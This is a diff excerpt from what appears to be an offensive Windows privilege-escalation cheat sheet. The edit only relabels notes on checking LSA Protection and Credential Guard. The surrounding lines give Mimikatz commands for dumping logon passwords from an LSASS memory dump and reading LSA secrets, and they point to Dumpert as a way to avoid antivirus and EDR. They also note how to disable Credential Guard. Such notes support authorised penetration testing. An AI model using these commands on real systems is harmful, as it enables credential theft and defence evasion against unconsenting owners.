@@ -268,10 +268,10 @@ PrivEsc
         minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
     Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
     
-  Check for LSA Protection (Protected LSASS)
+  Check for Protected LSASS
     shell reg query "hklm\system\currentcontrolset\control\lsa" 
-      RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
-      LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
+      LSA Protection: RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
+      Credential Guard: LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
   
   Mimikatz
     lsadump::secrets (Only SYSTEM can read)
